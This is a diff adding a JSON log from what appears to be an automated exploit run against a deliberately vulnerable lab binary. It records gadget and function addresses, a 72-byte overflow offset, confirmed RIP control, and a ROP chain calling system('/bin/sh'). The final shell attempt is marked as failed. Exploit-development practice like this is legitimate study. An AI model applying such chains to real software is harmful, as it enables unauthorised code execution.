@@ -1,0 +1,37 @@
+{
+  "binary": "./vulnerable64",
+  "timestamp": "2026-10-25T18:34:25.209044",
+  "arch": "amd64",
+  "pie": false,
+  "canary": false,
+  "nx": null,
+  "phases": {
+    "recon": {
+      "system_plt": "0x4010c4",
+      "bin_sh": "0x404060",
+      "pop_rdi_ret": "0x401353"
+    },
+    "fuzz": {
+      "crash_size": 64
+    },
+    "offset": {
+      "offset": 72,
+      "method": "buffer_size_plus_rbp"
+    },
+    "control_rip": {
+      "rip_target": "0x4242424242424242",
+      "crashed": true
+    },
+    "rop_chain": {
+      "offset": 72,
+      "pop_rdi": "0x401353",
+      "bin_sh": "0x404060",
+      "system": "0x4010c4",
+      "total_length": 96
+    },
+    "exploit": {
+      "shell": false,
+      "output": "Enter input: "
+    }
+  }
+}
